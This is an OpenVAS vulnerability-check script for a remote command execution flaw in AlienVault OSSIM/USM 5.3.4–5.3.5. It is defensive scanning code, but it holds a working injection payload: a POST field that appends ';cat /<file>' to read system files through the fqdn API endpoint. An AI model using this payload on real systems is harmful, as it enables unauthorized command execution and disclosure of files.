###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_alienvault_ossim_usm_5.3.6.nasl 11747 2018-10-04 09:58:33Z jschulte $
#
# AlienVault OSSIM/USM Remote Command Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140234");
  script_version("$Revision: 11747 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-04 11:58:33 +0200 (Thu, 04 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-04-03 17:33:13 +0200 (Mon, 03 Apr 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_name("AlienVault OSSIM/USM Remote Command Execution");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ossim_web_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 40011);
  script_mandatory_keys("OSSIM/installed");

  script_tag(name:"summary", value:"AlienVault OSSIM and USM are pront to a Remote Command Execution vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability can be found in the default installation without any plugins. The function get_fqdn do not validate user input.");

  script_tag(name:"solution", value:"Update to 5.3.6 or newer versions.");
  script_tag(name:"affected", value:"The vulnerability was introduced in the v5.3.4 update and affects only v5.3.4 and v5.3.5 of USM Appliance and OSSIM.");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3085");
  script_xref(name:"URL", value:"https://www.alienvault.com/forums/discussion/8415/alienvault-v5-3-6-hotfix-important-update");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

cpe_list = make_list( 'cpe:/a:alienvault:open_source_security_information_management', 'cpe:/a:alienvault:unified_security_management' );

if( ! port = get_app_port( cpe:cpe_list ) ) exit( 0 );

files = traversal_files("linux");

foreach pattern( keys( files ) ) {

  file = files[pattern];

  data = 'host_ip=' + get_host_ip()  + ';cat /' + file;

  req = http_post_req( port:port,
                       url:"/av/api/1.0/system/local/network/fqdn",
                       data:data,
                       add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" )
                     );

  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( egrep( string:buf, pattern:pattern ) )
  {
    report = 'It was possible to execute `cat /' + file + '` on the remote host.\n\nRequest:\n\n' + req + '\n\nResponse:\n\n' + buf;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );

